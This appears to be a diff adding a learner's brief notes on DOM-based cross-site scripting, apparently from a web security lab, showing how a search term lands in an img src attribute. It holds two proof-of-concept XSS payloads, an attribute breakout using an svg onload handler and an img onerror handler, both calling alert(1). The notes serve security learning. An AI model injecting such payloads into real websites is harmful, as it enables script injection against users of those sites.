@@ -1,0 +1,18 @@
+
+[ WEB > XSS > DOM ]
+
+// test input then inspect element.
+// e.g., in search. search for test123
+// you'll notice the text gets put in an img src tag:
+// <img src="/resources/images/tracker.gif?searchTerms=test123" rcivhjt7x="">
+
+// b-b-b-break out of the attribute... (yes, I've had lots of coffee right now...)
+"><svg onload=alert(1)>
+
+===
+
+// code allows injection of html
+// like freakin geniuses, we trigger an error then handle it in the same tag...
+<img src=1 onerror=alert(1)>
+
+
